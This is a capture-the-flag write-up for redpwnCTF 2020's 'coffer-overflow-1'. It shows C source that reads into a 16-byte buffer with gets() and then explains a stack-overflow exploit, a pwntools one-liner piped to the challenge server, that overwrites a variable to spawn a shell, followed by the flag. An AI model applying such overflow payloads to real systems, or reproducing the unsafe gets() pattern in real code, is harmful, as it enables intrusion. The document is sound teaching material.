# coffer-overflow-1

> The coffers keep getting stronger! You'll need to use the source, Luke.

> nc 2020.redpwnc.tf 31255

Files provided:
* coffer-overflow-1.c  -  C source code
* coffer-overflow-1   - 64bit ELF file


C source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}

```

This is similar to [coffer-overflow-1], but at this time, we have to put an exactly value into `code`.
This value is `0xcafebabe`.

So, our payload will be something like this: `[24-RANDOM_CHARS][0x00000000cafebabe]`.

Remeber that because of `little-endian`, we have to write integers bytes reversed. To do this in python we can use the `pwn` library.

```sh
$  ( python -c "from pwn import *; print 'A'*24+p64(0xcafebabe)"; cat ) | nc 2020.redpwnc.tf 31255
```

And here is the flag: `flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}`


[coffer-overflow-1]: <https://github.com/Yankoo458/CTF-writeups/blob/master/RedpwnCTF2020/pwn/coffer-overflow-0/coffer-overflow-0.md>
